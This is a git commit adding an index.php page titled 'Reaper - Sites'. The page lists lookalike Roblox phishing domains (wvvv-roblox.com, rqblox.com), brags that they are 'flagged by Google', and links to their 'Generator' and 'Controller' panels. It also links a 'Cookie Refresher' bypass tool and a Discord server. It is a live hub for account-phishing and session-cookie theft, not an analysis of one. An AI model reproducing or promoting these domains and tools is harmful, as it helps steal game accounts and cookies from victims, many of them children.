26e3ebe5fe9070936c9247140a27120f99aa7ad0
Pikaminta <148913780+Pikaminta@users.noreply.github.com>
2023-10-25 21:24:28 +0300

    Create index.php

---
+++ index.php
@@ -0,0 +1,100 @@
+<head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width,initial-scale=1">
+    <title>Reaper - Sites</title>
+    <link rel="icon" type="image/x-icon" href="https://media.discordapp.net/attachments/1162860934071586816/1162874862465978388/reaper.jpg?ex=653d869c&is=652b119c&hm=64dccfc9165a227e0dab849a127fae46498ccbe72c8d13a9887d764986b82622&">
+    <meta content="Reaper - Sites" property="og:title">
+    <meta content="#1 Sites" property="og:description">
+    <meta content="https://immortal.lt/sites" property="og:url">
+    <meta content="https://media.discordapp.net/attachments/1162860934071586816/1162874862465978388/reaper.jpg?ex=653d869c&is=652b119c&hm=64dccfc9165a227e0dab849a127fae46498ccbe72c8d13a9887d764986b82622&" property="og:image">
+    <meta content="#8F00FF" data-react-helmet="true" name="theme-color">
+        <link href="0.css" rel="stylesheet">
+    </head>
+    <body class="bg-neutral-900">
+        
+<style>
+  a{
+    color: #4169E1;
+    text-decoration: underline;
+    background-color: transparent;
+  }
+  a:hover {
+  color: blue;
+  background-color: transparent;
+  text-decoration: underline;
+}
+blockquote {margin: 11px 0px 0px 0px;}
+</style>
+        <div id="root">
+            <div class="relative pt-23 pb-23 select-none">
+                <div class="relative mx-auto max-w-7xl px-10 sm:px-6 lg:px-8 xl:px-4 2xl:px-4 sm:static">
+                  <blockquote>
+                   <h1 class="text-4xl font tracking-tight font-extrabold text-white sm:text-6xl mb-4">Sites</h1>
+                    <p class="text-gray-400 font-bold text-xl max-w-2xl mb-4">⚠️ Scroll down to see all domains</p> 
+                    <div class="grid grid-cols-1 gap-5 pb-16 w-full max-w-lg">
+
+                          <div class="group bg-neutral-800 bg-opacity-75 border border-neutral-700 text-white rounded-xl p-4">
+                                <h2 class="font-extrabold text-xl mb-1 flex">
+                                    <svg class="h-6 w-6 inline-block mr-2" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 20l4-16m4 4l4 4-4 4M6 16l-4-4 4-4"></path>
+                                    </svg>
+<p class="duration-300 transition text-white-600">wvvv-roblox.com (⭐ BEST , FLAGGED ) </p>
+                                </h2>
+<a href="https://wvvv-roblox.com/controlPage/create" class="text-sm text-red-400">Click to go to Generator</a>
+                            <blockquote>
+<a href="https://wvvv-roblox.com/controlPage" class="text-sm text-red-400">Click to go to Controller</a>
+                            <blockquote>
+<a href="https://wvvv-roblox.com/discover" class="text-sm text-red-400">Click to go to Discover Page</a>
+                          </blockquote></blockquote></div>
+                        
+                                                                                                             <div class="grid grid-cols-1 gap-5 pb-16 w-full max-w-lg">
+
+                        
+                            <div class="group bg-neutral-800 bg-opacity-75 border border-neutral-700 text-white rounded-xl p-4">
+                                <h2 class="font-extrabold text-xl mb-1 flex">
+                                    <svg class="h-6 w-6 inline-block mr-2" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 20l4-16m4 4l4 4-4 4M6 16l-4-4 4-4"></path>
+                                    </svg>
+<p class="duration-300 transition text-white-600">www.rqblox.com (⭐ OP, FLAGGED BY GOOGLE )</p>
+                                </h2>
+<a href="https://rqblox.com/controlPage/create" class="text-sm text-red-400">Click to go to Generator</a>
+                            <blockquote>
+<a href="https://rqblox.com/controlPage" class="text-sm text-red-400">Click to go to Controller</a>
+                            <blockquote>
+<a href="https://rqblox.com/discover" class="text-sm text-red-400">Click to go to Discover Page</a>
+                          </blockquote></blockquote></div>     
+
+   
+                          <div class="group bg-neutral-800 bg-opacity-75 border border-neutral-700 text-white rounded-xl p-4">
+                                <h2 class="font-extrabold text-xl mb-1 flex">
+                                    <svg class="h-6 w-6 inline-block mr-2" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 20l4-16m4 4l4 4-4 4M6 16l-4-4 4-4"></path>
+                                    </svg>
+<p class="duration-300 transition text-white-600">Cookie Refresher (⭐ BEST, FASTEST ) </p>
+                                </h2>
+<a href="https://wvvv-roblox.com/Cookie/bypass" class="text-sm text-red-400">Click to go to Cookie Refresher</a>
+                            <blockquote></blockquote></div>
+                        
+                                                                                                             <div class="grid grid-cols-1 gap-5 pb-16 w-full max-w-lg">
+
+
+                            <div class="group bg-neutral-800 bg-opacity-75 border border-neutral-700 text-white rounded-xl p-4">
+                                <h2 class="font-extrabold text-xl mb-1 flex">
+                                    <svg class="h-6 w-6 inline-block mr-2" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 20l4-16m4 4l4 4-4 4M6 16l-4-4 4-4"></path>
+                                    </svg>
+<p class="duration-300 transition text-white-600">Discord Server</p>
+                                </h2>
+<a href="https://discord.gg/rUa6sMabZY" class="text-sm text-red-400">Discord Server =&gt;</a>
+                            <blockquote>
+
+
+                               
+
+                    </blockquote></div>
+                </div>
+            </div>
+        </div>
+    
+<script data-goatcounter="https://immortal.goatcounter.com/count" async="" src="//gc.zgo.at/count.js"></script>
+</blockquote></div></div></div></body>
